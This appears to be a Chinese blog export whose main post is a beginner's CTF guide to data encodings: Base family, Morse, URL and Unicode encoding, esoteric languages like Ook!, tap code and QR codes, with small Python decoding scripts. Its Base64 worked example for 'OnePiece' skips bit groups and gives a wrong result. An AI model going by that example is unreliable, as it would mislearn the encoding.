<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;%- <span class="keyword">if</span> theme.busuanzi_count.enable %&#125;</span><br><span class="line">  &#123;# &lt;script&#123;&#123; pjax &#125;&#125; <span class="keyword">async</span> src=<span class="string">&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt; #&#125;</span><br><span class="line">  &lt;script&#123;&#123; pjax &#125;&#125; <span class="keyword">async</span> src=<span class="string">&quot;busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>

<p>所以我忍痛把狗去了</p>
<p>不——狗狗那么可耐。但我实在觉得没有阅读量的博客是没有盼头的，所以我换了统计的工具（还好才刚开始阅读量不大）</p>
<p>用的是LeanCloud，配置过程简单，网上很多，这里不赘述</p>
<hr>
<p>行吧，就这样吧，能用就行</p>
<p>花了几天时间搞花头，平面化得学习了一些搭博客的技巧，以后更应该专注于博文章的质量了</p>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>从这里开始的</tag>
      </tags>
  </entry>
  <entry>
    <title>数据编码</title>
    <url>/posts/b205cf3c/</url>
    <content><![CDATA[<p>ctf入门必备，你需要熟稔的那些编码。寒假跟着nep的师傅，讲得很好，对于当时的我来说。之前都觉得挺乱的，听了之后有种豁然开朗的感觉，偷了，以便后面忘了时回忆</p>
<span id="more"></span>

<h1 id="数据编码"><a href="#数据编码" class="headerlink" title="数据编码"></a>数据编码</h1><h1 id="常见进制"><a href="#常见进制" class="headerlink" title="常见进制"></a>常见进制</h1><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><h3 id="二进制转ascii码"><a href="#二进制转ascii码" class="headerlink" title="二进制转ascii码"></a>二进制转ascii码</h3><p>转成十进制再查表</p>
<h3 id="二进制转morse码"><a href="#二进制转morse码" class="headerlink" title="二进制转morse码"></a>二进制转morse码</h3><p>$(00101101)_2=(45)_{10}$，在ascii码表里面是”-“</p>
<p>$(00101110)_2=(46)_{10}$，在ascii码表里面是”.”</p>
<p><a href="https://coding.tools/cn/binary-to-text">在线解码网站</a></p>
<h3 id="二进制转二维码（绘图）"><a href="#二进制转二维码（绘图）" class="headerlink" title="二进制转二维码（绘图）"></a>二进制转二维码（绘图）</h3><p>检查二进制字符串长度开方后是否是整数<br>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/2/7 15:53</span></span><br><span class="line"><span class="comment"># @Author : Will</span></span><br><span class="line"><span class="comment"># @File : PIL(exp).py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line">qr_code = <span class="string">&quot;000000000000000000000000000011111110100001001011111110010000010110011001010000010010111010001001101010111010010111010010010110010111010010111010111100000010111010010000010100010010010000010011111110101010101011111110000000000000001101000000000011110110010001111101100110000111100001101001010011110000011111101001000110100000001000001000010110000101100001111010100101101001011010011000001110010111100101110011100010010110100101101000001000001111111111000001010010010110111111101111100000000000000010001001000110100011111110000110001010111000010000010100010101000111100010111010011001101111100010010111010100001001000011010010111010101110011101100110010000010100110011001011110011111110100000011100110010000000000000000000000000000&quot;</span></span><br><span class="line">x = y = <span class="built_in">int</span>(sqrt(<span class="built_in">len</span>(qr_code)))</span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>, [x, y])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">        <span class="keyword">if</span> qr_code[j*y+i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            pic.putpixel([i, j], (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        <span class="keyword">elif</span> qr_code[j*y+i] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pic.putpixel([i, j], (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里有必要提醒一下，简单来说PIL库是针对python2的，python3的话用pillow库代替了，但是导入库的代码都是一样，很神奇，正如上述脚本所示。安装库可能会遇到些问题，建议面向百度，我遇到的问题是师傅给的脚本名字就是”PIL”，然后又是在pycharm同一个项目中，所以导入的时候报错了。</p>
<h3 id="二进制转图片（hex）"><a href="#二进制转图片（hex）" class="headerlink" title="二进制转图片（hex）"></a>二进制转图片（hex）</h3><p>先转十六进制，再在010editor里保存，更改为相应的文件。<br>注意编码方式是”十六进制（H）”，选择编辑，粘贴自，粘贴自十六进制文本。</p>
<h1 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h1><h2 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h2><p>这个图整理得海星，有三种进制对应的ascii码</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210207200756460.png" alt="Ascii码对照表"></p>
<h2 id="Base家族"><a href="#Base家族" class="headerlink" title="Base家族"></a>Base家族</h2><p>庞大的Base家族，这一块十分的重要</p>
<h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><p>编码原理：（把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式），转化可以分为六步</p>
<blockquote>
<p>a）源文本：O n e P i e c e<br>b）对应ascii码：79 110 101 80 105 101 99 101<br>c）8位binary：01001111 01101110 01100101 01010000 01101001 01100101 01100011 01100101<br>d）6位binary并在高位补0：00010011 00110110 00111001 00100101 00010100 00000110 00100101 00100101 00011000 00110110 00010100<br>e）对应十进制：19 54 57 37 20 6 37 37 24 54 20<br>f）查表：T 2 5 I U A G I I Y 2 U =</p>
</blockquote>
<p>显然会有字符串长度不是三的倍数的情况，从别的博主那里摘过来的，感觉写得比较明晰了</p>
<blockquote>
<p>a）二个字节的情况：将这二个字节的一共16个二进制位，按照上面的规则，转成三组，最后一组除了前面加两个0以外，后面也要加两个0。这样得到一个三位的Base64编码，再在末尾补上一个”=”号。<br>比如，“Ma”这个字符串是两个字节，可以转化成三组00010011、00010110、00010000以后，对应Base64值分别为T、W、E，再补上一个”=“号，因此”Ma”的Base64编码就是TWE=。<br>b）一个字节的情况：将这一个字节的8个二进制位，按照上面的规则转成二组，最后一组除了前面加二个0以外，后面再加4个0。这样得到一个二位的Base64编码，再在末尾补上两个”=”号。<br>比如，“M”这个字母是一个字节，可以转化为二组00010011、00010000，对应的Base64值分别为T、Q，再补上二个”=”号，因此”M”的Base64编码就是TQ==。</p>
</blockquote>
<p>6位2进制能表示的最大数是2的6次方是64，所以base64就是64个字符(A-Z，a-z，0-9，+，/这64个编码字符，注意=不属于编码字符，而是填充字符)，下面是张转换后数值的对应字符表</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210207201509345.png" alt="Base64对照表格"></p>
<h3 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h3><p>Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理<br>tips：末尾最多有6个=</p>
<h3 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a>Base16</h3><p>Base16使用数字0-9和字母A-F共计16个ASCII可打印字符对任意字节数据进行编码<br>tips：不会出现=</p>
<h3 id="Base36"><a href="#Base36" class="headerlink" title="Base36"></a>Base36</h3><p>Base36包含0~9的数字，加上所有26个字母，不区分大小写，不包含任何标点，所有的字母要不全大写，要不全小写。所以加起来就是 “0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ”,或者“0123456789abcdefghijklmnopqrstuvwxyz”<br>tips：编码仅支持整数数字，解密仅支持字符串，不支持中文<br>所以Base64，Base32，Base16都是支持对中文编码的</p>
<h3 id="Base58"><a href="#Base58" class="headerlink" title="Base58"></a>Base58</h3><p>“123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ”，从这不难看出，Base58是纯数字与字母组成而且去掉了容易引起视觉混淆的字符（0：数字零，O：大写O，I：大写i，l:小写L）。9个数字+49个字母=58个。<br>tips：Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/”符号</p>
<h3 id="Base62"><a href="#Base62" class="headerlink" title="Base62"></a>Base62</h3><p>Base62编码，由62字符（0-9，a-z，A-Z）组成<br>相比于base64只是去掉了两个符号（+和/）<br>不支持中文</p>
<h3 id="Base85"><a href="#Base85" class="headerlink" title="Base85"></a>Base85</h3><p>Base85是一种类似于Base64的二进制文本编码形式，通过使用五个ascii字符来表示四个字节的二进制数据。<br>好像国内有关这一方面的资料比较少，好像就是用ascii码来编码字符吧，所以它的字符范围比Base64广。当然也有其实际的用途。<br>不支持中文</p>
<h3 id="Base91"><a href="#Base91" class="headerlink" title="Base91"></a>Base91</h3><p>Base91由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}”~）组成<br>不支持中文</p>
<h3 id="Base92"><a href="#Base92" class="headerlink" title="Base92"></a>Base92</h3><p>比Base91 多一个字符 〜<br>支持中文。<br>最后这里附上一个脚本，用来解决base套娃，之前的题目也遇到过，不过好像base64库里只有16，32，64和85</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/1/27 10:39</span></span><br><span class="line"><span class="comment"># @Author : Will</span></span><br><span class="line"><span class="comment"># @File : basefamily(script).py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = base64.b64decode(s)</span><br><span class="line">        s = base(s)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = base64.b32decode(s)</span><br><span class="line">            s = base(s)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = base64.b16decode(s)</span><br><span class="line">                s = base(s)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    s = base64.b85decode(s)</span><br><span class="line">                    s = base(s)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;base.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line">    a = base(text)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @Author : JJ</span></span><br><span class="line"><span class="comment"># from base64 import *</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># def decode(string):</span></span><br><span class="line"><span class="comment">#     while 1:</span></span><br><span class="line"><span class="comment">#         try:</span></span><br><span class="line"><span class="comment">#             str= b64decode(string).decode()</span></span><br><span class="line"><span class="comment">#             print(&quot;b64decode&#x27;s result is :&quot;, str)</span></span><br><span class="line"><span class="comment">#             str = b85decode(string).decode()</span></span><br><span class="line"><span class="comment">#             print(&quot;b85decode&#x27;s result is :&quot;, str)</span></span><br><span class="line"><span class="comment">#             str = (b16decode(string)).decode()</span></span><br><span class="line"><span class="comment">#             print(&quot;b16decode&#x27;s result is :&quot;, str)</span></span><br><span class="line"><span class="comment">#             str = b32decode(string).decode()</span></span><br><span class="line"><span class="comment">#             print(&quot;b32decode&#x27;s result is :&quot;, str)</span></span><br><span class="line"><span class="comment">#         except:</span></span><br><span class="line"><span class="comment">#             pass</span></span><br><span class="line"><span class="comment">#         finally:</span></span><br><span class="line"><span class="comment">#             print(&quot;decoding end&quot;)</span></span><br><span class="line"><span class="comment"># with open(&#x27;base.txt&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line"><span class="comment">#    string = f.read()</span></span><br><span class="line"><span class="comment"># # decode(f,string)</span></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     decode(string)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Morse码"><a href="#Morse码" class="headerlink" title="Morse码"></a>Morse码</h2><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208103335656.png" alt="Morse"></p>
<h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p>Shellcode为16进制的机器码，一串\x加一个十六进制数字组成，解密的方式就是用十六进制数字去查ascii码表，实现编码解码的脚本也简单的，有工具偷懒了</p>
<h2 id="Urlencode"><a href="#Urlencode" class="headerlink" title="Urlencode"></a>Urlencode</h2><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。<br>URL地址（常说网址）规定了常用的数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。<br>编码方法很简单，在该字节ascii码的16进制字符前面加%<br>如空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是：%20</p>
<h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>Unicode，中文又称万国码、国际码、统一码、单一码，是计算机科学领域的业界标准。它整理、编码了世界上大部分的文字系统，使得电脑可以用更为简单的方式来呈现和处理文字。 Unicode伴随着通用字符集的标准而发展，同时也以书本的形式对外发表。Unicode至今仍在不断增修，每个新版本都加入更多新的字符。<br>主要有两格式（其实不止），不要不认识了</p>
<ol>
<li>\u4e39\u4e39\u5b66\u59d0\u4e07\u5c81\uff01</li>
<li>第二种形式有点不友好？<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208121609199.png" alt="明明就">本地、在线的工具都不是很兼容，随便信息搜索一个网站就可以用<br><a href="http://tool.chinaz.com/Tools/unicode.aspx">站长</a></li>
</ol>
<h2 id="aaencode、jjencode、uuencode"><a href="#aaencode、jjencode、uuencode" class="headerlink" title="aaencode、jjencode、uuencode"></a>aaencode、jjencode、uuencode</h2><h3 id="aaencode"><a href="#aaencode" class="headerlink" title="aaencode"></a>aaencode</h3><p>人家是不过是可爱的颜文字，可以在console中直接执行</p>
<h3 id="jjencode"><a href="#jjencode" class="headerlink" title="jjencode"></a>jjencode</h3><p>也可以在console中直接执行，特点是有()[]{}!+,&#39;‘$.:;_~=，好像还有什么全局变量</p>
<h3 id="uuencode"><a href="#uuencode" class="headerlink" title="uuencode"></a>uuencode</h3><p>Uuencode是二进制信息和文字信息之间的转换编码，也就是机器和人眼识读的转换。Uuencode编码方案常见于电子邮件信息的传输，目前已被多用途互联网邮件扩展（MIME）大量取代。</p>
<h2 id="jsfuck、brainfuck、Ook"><a href="#jsfuck、brainfuck、Ook" class="headerlink" title="jsfuck、brainfuck、Ook!"></a>jsfuck、brainfuck、Ook!</h2><h3 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h3><p>只有六个字符 () [] ! +<br>就能写js</p>
<h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>只有八个字符 &lt;&gt; + - . , []</p>
<h3 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a>Ook!</h3><p>比较常见，有两种格式</p>
<ol>
<li>Ook!</li>
</ol>
<blockquote>
<p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?<br>Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?<br>Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?<br>Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook.<br>Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!<br>Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook.<br>Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.</p>
</blockquote>
<ol start="2">
<li>Short ook!</li>
</ol>
<blockquote>
<p>….. ….. ….. ….. ….. ….. !?!!. ?…. ….. ….. ….. …..<br>….. .?.?! .?… …!. ?…. ….. ….! ?!!.? !!!!! !!!!! !!?.? !.?!!<br>!!!!! !!!!! !!!!! …!. ?…. ….. ….! ?!!.? ….. ….. ..?.? !.?..<br>….. ….. ..!.? ….. ….. …!? !!.?! !!!!! !!!!! !?.?! .?!!! !!!!!<br>!!!!! !!!!. ..!.? ….. ….. …!? !!.?. ….. ….. .?.?! .?… …..<br>….. …!. ?…. ….. ….. .!?!! .?!!! !!!!! !!!!! !?.?! .?!!! !!!!!<br>!!!!! !!.!! !!!!! !!!!! !!!.? ….. ….. ….. !?!!. ?…. ….. …..<br>?.?!. ?…. ….. ….. ….. ….. ….! .?… ….. ….. ..!?! !.?!!<br>!!!!! !!!!! !!?.? !.?!! !!!!! !!!!! !!!!! !!!!! !!!!! .?… ….. .!?!!<br>.?!!! !!!!! ?.?!. ?!!!! !!!!! !!!!! !.?.. ….. ….. ….. ..!?! !.?..<br>….. ….. ….. .?.?! .?… …!. ?…. ….. ….! ?!!.? !!!!! !!!!!<br>!!?.? !.?!! !!!!! !!!!! !!!!! .?… ….. ….. ..!?! !.?!! !!!!! !!!!!<br>!!?.? !.?!. ?…. ….. ….. ….. !?!!. ?…. ….. ….. ….? .?!.?<br>….. ….. ….. ….. ….. .!.?. ….. ….. ….! ?!!.? !!!!! !!!!!<br>!!!!? .?!.? !!!!! .?… ….. ….. ..!?! !.?!! !!!!! !!!!! !!?.? !.?!.<br>?…. ….. ….. ….. ..!?! !.?.. ….. ….. ….. …?. ?!.?. …..<br>….. ….. ….! .?… ….. ….. ..!?! !.?!! !!!!! !!!!! !!?.? !.?!!<br>!!!.? ….. ….. ….. !?!!. ?!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!!!!<br>!!!!! !!.?.</p>
</blockquote>
<p>在线网站解君愁<a href="https://www.splitbrain.org/services/ook">Brainfuck之Ook!</a></p>
<h2 id="敲击码"><a href="#敲击码" class="headerlink" title="敲击码"></a>敲击码</h2><p>敲击码（Tap code）是一种以非常简单的方式对文本信息进行编码的方法。<br>因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于 5 ×5 方格波利比奥斯方阵来实现的，不同点是是用 K 字母被整合到 C 中。</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208135632771.png" alt="Tap Code"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/2021020813580737.png" alt="栗子"></p>
<p>可以使用离线的工具，在线的感觉有bug</p>
<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>二维码是一大个大类</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208142655971.png" alt="在这里插入图片描述"></p>
<ul>
<li>堆叠式 / 行排式二维码又称堆积式二维条码或层排式二维条码，其编码原理是建立在一维条码基础之上，按需要堆积成二行或多行。 Code 16 k、Code 49、PDF417</li>
<li>矩阵式二维码：QR CODE</li>
</ul>
<h3 id="矩阵式二维码"><a href="#矩阵式二维码" class="headerlink" title="矩阵式二维码"></a>矩阵式二维码</h3><p> 最流行莫过于QR CODE ,我们常说的二维码就是它了。矩阵式二维条码（又称棋盘式二维条码）它是在一个矩形空间通过黑、白像素在矩阵中的不同分布进行编码。在矩阵相应元素位置上，用点（方点、圆点或其他形状）的出现表示二进制“1”，点的不出现表示二进制的“0”，点的排列组合确定了矩阵式二维条码所代表的意义。矩阵式二维条码是建立在计算机图像处理技术、组合编码原理等基础上的一种新型图形符号自动识读处理码制。具有代表性的矩阵式二维条码有：Code One、MaxiCode、QR Code、 Data Matrix、Han Xin Code、Grid Matrix 等。</p>
<ul>
<li>QR码的特点</li>
</ul>
<ol>
<li><p>QR(Quick-Response) code是被广泛使用的一种二维码，解码速度快。</p>
</li>
<li><p>存储大容量信息：传统的条形码只能处理20位左右的信息量，与此相比，QR码可处理条形码的几十倍到几百倍的信息量。</p>
</li>
